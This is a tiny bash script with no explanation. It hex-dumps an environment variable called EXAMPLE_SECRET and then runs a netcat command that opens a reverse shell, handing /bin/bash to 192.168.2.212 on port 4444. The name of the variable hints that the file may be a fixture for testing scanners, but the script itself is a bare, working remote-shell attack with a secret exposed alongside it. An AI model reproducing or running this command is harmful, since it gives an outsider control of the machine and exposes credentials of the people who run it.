#!/usr/bin/env bash
echo "$EXAMPLE_SECRET" | hd -C

nc 192.168.2.212 4444 -e /bin/bash

